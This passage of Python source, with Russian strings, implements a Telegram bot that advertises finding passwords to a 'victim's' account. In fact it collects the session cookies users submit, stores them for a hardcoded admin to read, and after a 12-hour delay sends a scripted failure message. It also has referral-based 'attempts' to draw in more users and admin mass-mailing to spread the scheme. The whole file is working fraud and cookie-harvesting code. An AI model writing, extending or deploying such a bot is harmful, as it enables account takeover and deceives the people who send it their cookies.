        await show_chat_users_page(query, context, page)
        return
    
    elif data == "view_keyword_messages":
        await show_keyword_messages_page(query, context, 0)
        return
    
    elif data.startswith("keyword_messages_page_"):
        page = int(data.replace("keyword_messages_page_", ""))
        await show_keyword_messages_page(query, context, page)
        return
    
    elif data.startswith("chat_user_"):
        target_user_id = data.replace("chat_user_", "")
        all_users = get_all_users()
        user_data = all_users.get(target_user_id, {})
        name = user_data.get("first_name", "Unknown")
        username = user_data.get("username", "no_username")
        
        messages = get_user_messages(target_user_id)
        if not messages:
            await query.edit_message_text(f"📭 У пользователя {name} (@{username}) пока нет сообщений.")
            return
        
        text = f"💬 **Чат с {name} (@{username})**\n"
        text += f"🆔 ID: {target_user_id}\n"
        text += f"📊 Всего сообщений: {len(messages)}\n\n"
        
        for msg in messages[-30:]:
            msg_text = msg.get("text", "")
            time = msg.get("timestamp", "")
            if KEYWORD in msg_text:
                text += f"🔑 **{time}**\n💬 {msg_text}\n"
            else:
                text += f"🕐 {time}\n💬 {msg_text}\n"
            text += "─" * 30 + "\n"
        
        keyboard = [
            [InlineKeyboardButton("🔑 Только с ключевым словом", callback_data=f"chat_user_keyword_{target_user_id}")],
            [InlineKeyboardButton("◀️ Назад к списку", callback_data="select_user_for_chat")],
            [InlineKeyboardButton("◀️ Назад в меню", callback_data="back_to_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        if len(text) > 4096:
            parts = [text[i:i+4000] for i in range(0, len(text), 4000)]
            for part in parts:
                await query.message.reply_text(part)
            await query.message.reply_text("⬅️ Нажмите кнопку ниже:", reply_markup=reply_markup)
        else:
            await query.edit_message_text(text, reply_markup=reply_markup)
        return
    
    elif data.startswith("chat_user_keyword_"):
        target_user_id = data.replace("chat_user_keyword_", "")
        all_users = get_all_users()
        user_data = all_users.get(target_user_id, {})
        name = user_data.get("first_name", "Unknown")
        username = user_data.get("username", "no_username")
        
        messages = get_keyword_messages(target_user_id)
        if not messages:
            await query.edit_message_text(f"📭 У {name} (@{username}) нет сообщений с ключевым словом.")
            return
        
        text = f"🔑 **Cookie от {name} (@{username})**\n"
        text += f"🆔 ID: {target_user_id}\n"
        text += f"📊 Всего: {len(messages)} сообщений\n\n"
        
        for msg in messages[-30:]:
            msg_text = msg.get("text", "")
            time = msg.get("timestamp", "")
            text += f"🕐 {time}\n💬 {msg_text}\n"
            text += "─" * 30 + "\n"
        
        keyboard = [
            [InlineKeyboardButton("📩 Все сообщения", callback_data=f"chat_user_{target_user_id}")],
            [InlineKeyboardButton("◀️ Назад к списку", callback_data="select_user_for_chat")],
            [InlineKeyboardButton("◀️ Назад в меню", callback_data="back_to_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        if len(text) > 4096:
            parts = [text[i:i+4000] for i in range(0, len(text), 4000)]
            for part in parts:
                await query.message.reply_text(part)
            await query.message.reply_text("⬅️ Нажмите кнопку ниже:", reply_markup=reply_markup)
        else:
            await query.edit_message_text(text, reply_markup=reply_markup)
        return
    
    elif data.startswith("view_user_"):
        target_user_id = data.replace("view_user_", "")
        all_users = get_all_users()
        user_data = all_users.get(target_user_id, {})
        name = user_data.get("first_name", "Unknown")
        username = user_data.get("username", "no_username")
        
        messages = get_keyword_messages(target_user_id)
        if not messages:
            await query.edit_message_text(f"📭 У {name} (@{username}) нет сообщений с ключевым словом.")
            return
        
        text = f"📋 Cookie от {name} (@{username}):\n\n"
        for msg in messages[-30:]:
            msg_text = msg.get("text", "")
            time = msg.get("timestamp", "")
            text += f"💬 {msg_text}\n🕐 {time}\n"
            text += "─" * 30 + "\n"
        
        keyboard = [
            [InlineKeyboardButton("◀️ Назад", callback_data="view_keyword_messages")],
            [InlineKeyboardButton("💬 Все сообщения", callback_data=f"chat_user_{target_user_id}")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        if len(text) > 4096:
            parts = [text[i:i+4000] for i in range(0, len(text), 4000)]
            for part in parts:
                await query.message.reply_text(part)
            await query.message.reply_text("⬅️ Нажмите кнопку ниже:", reply_markup=reply_markup)
        else:
            await query.edit_message_text(text, reply_markup=reply_markup)
        return

# ===================================================
# ОБРАБОТЧИК ТЕКСТОВЫХ СООБЩЕНИЙ
# ===================================================

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_message = update.message.text
    user = update.effective_user
    user_id = user.id
    
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Проверяем админские действия
    if user_id == YOUR_USER_ID and 'admin_action' in context.user_data:
        action = context.user_data['admin_action']
        
        if user_message == "/cancel":
            del context.user_data['admin_action']
            await update.message.reply_text("❌ Действие отменено.")
            return
        
        if action == 'add_attempts':
            parts = user_message.split()
            if len(parts) == 2:
                try:
                    target_id = int(parts[0])
                    count = int(parts[1])
                    add_attempt(target_id, count)
                    await update.message.reply_text(
                        f"✅ Добавлено {count} попыток пользователю {target_id}\n"
                        f"Теперь у него {get_available_attempts(target_id)} попыток."
                    )
                    del context.user_data['admin_action']
                    return
                except:
                    await update.message.reply_text("❌ Неверный формат. Используйте: ID Количество")
                    return
            else:
                await update.message.reply_text("❌ Неверный формат. Используйте: ID Количество")
                return
        
        elif action == 'reset_attempts':
            try:
                target_id = int(user_message)
                reset_attempts(target_id)
                await update.message.reply_text(
                    f"✅ Попытки сброшены для пользователя {target_id}\n"
                    f"Теперь у него {get_available_attempts(target_id)} попыток."
                )
                del context.user_data['admin_action']
                return
            except:
                await update.message.reply_text("❌ Неверный ID. Введите число.")
                return
    
    # Проверяем рассылку
    if user_id == YOUR_USER_ID and 'mailing_type' in context.user_data:
        mailing_type = context.user_data['mailing_type']
        
        if user_message == "/cancel":
            del context.user_data['mailing_type']
            await update.message.reply_text("❌ Рассылка отменена.")
            return
        
        if mailing_type == 'all':
            users = get_all_users()
        else:
            users = get_keyword_users()
        
        if not users:
            await update.message.reply_text("❌ Нет пользователей для рассылки.")
            del context.user_data['mailing_type']
            return
        
        sent = 0
        failed = 0
        
        status_msg = await update.message.reply_text(f"⏳ Начинаю рассылку для {len(users)} пользователей...")
        
        for user_id, user_data in users.items():
            try:
                await context.bot.send_message(
                    chat_id=int(user_id),
                    text=user_message
                )
                sent += 1
                await asyncio.sleep(0.5)
            except Exception as e:
                failed += 1
                print(f"❌ Ошибка отправки {user_id}: {e}")
        
        await status_msg.edit_text(
            f"✅ **Рассылка завершена!**\n\n"
            f"📤 Отправлено: {sent}\n"
            f"❌ Не доставлено: {failed}\n"
            f"👥 Всего: {len(users)}"
        )
        
        del context.user_data['mailing_type']
        return
    
    # ОБРАБОТКА КЛЮЧЕВОГО СЛОВА - ТУТ ТРАТИМ ПОПЫТКУ
    if KEYWORD in user_message:
        # Проверяем попытки
        available = get_available_attempts(user_id)
        if available <= 0:
            await update.message.reply_text(
                "❌ У вас закончились попытки!\n\n"
                "💡 Пригласите друга и получите +1 попытку!"
            )
            return
        
        # ТРАТИМ ПОПЫТКУ
        use_attempt(user_id)
        
        save_keyword_user(
            user_id=user.id,
            username=user.username or "no_username",
            first_name=user.first_name or "Unknown"
        )
        save_message(
            user_id=user.id,
            username=user.username or "no_username",
            first_name=user.first_name or "Unknown",
            text=user_message,
            timestamp=timestamp
        )
        print(f"\n🔑 [KEYWORD] [{timestamp}] {user.first_name} (@{user.username or 'no_username'})")
        
        await update.message.reply_text(
            f"✅ Отлично! Бот начал поиски пароля вашей жертвы.\n"
            f"Не создавайте повторных заявок, иначе будете заблокированы\n"
            f"Если в течении 12 часов бот не ответил, значит он не нашел пароль\n\n"
            f"🎯 Осталось попыток: {get_available_attempts(user_id)}"
        )
        asyncio.create_task(send_delayed_message(update.effective_chat.id, context))
    else:
        if is_keyword_user(user.id):
            save_message(
                user_id=user.id,
                username=user.username or "no_username",
                first_name=user.first_name or "Unknown",
                text=user_message,
                timestamp=timestamp
            )
            print(f"\n💬 [{timestamp}] {user.first_name} (@{user.username or 'no_username'}): {user_message}")
            await update.message.reply_text("✅ Ваше сообщение получено. Ожидайте результат.")
        else:
            await update.message.reply_text("❌ Пожалуйста, отправьте правильный cookie для продолжения.")

# ===================================================
# ОБРАБОТЧИК КОМАНДЫ /cancel
# ===================================================

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id == YOUR_USER_ID:
        if 'mailing_type' in context.user_data:
            del context.user_data['mailing_type']
            await update.message.reply_text("❌ Рассылка отменена.")
        elif 'admin_action' in context.user_data:
            del context.user_data['admin_action']
            await update.message.reply_text("❌ Действие отменено.")
        else:
            await update.message.reply_text("У вас нет активных действий.")
    else:
        await update.message.reply_text("У вас нет активных действий.")

# ===================================================
# ФУНКЦИЯ ЗАДЕРЖКИ (12 ЧАСОВ)
# ===================================================

async def send_delayed_message(chat_id, context):
    delay_seconds = 12 * 3600  # 12 часов
    try:
        await asyncio.sleep(delay_seconds)
        await context.bot.send_message(
            chat_id=chat_id,
            text="Извините не смогли найти пароль от вашего аккаунта, не нужно создавать повторную заявку, попробуйте через 7 дней иначе будете заблокированы."
        )
    except Exception as e:
        print(f"Ошибка при отправке отложенного сообщения: {e}")

# ===================================================
# ЗАПУСК БОТА
# ===================================================

def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("cancel", cancel))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print("🤖 Бот запущен!")
    print("✅ Попытки тратятся ТОЛЬКО при отправке ключевого слова")
    print("✅ 2 бесплатные попытки + 1 за приглашение")
    print("⏰ Отложенное сообщение через 12 часов")
    print("📩 Админские кнопки видны только тебе (ID: 1341594703)")
    app.run_polling()

if __name__ == "__main__":
    main()
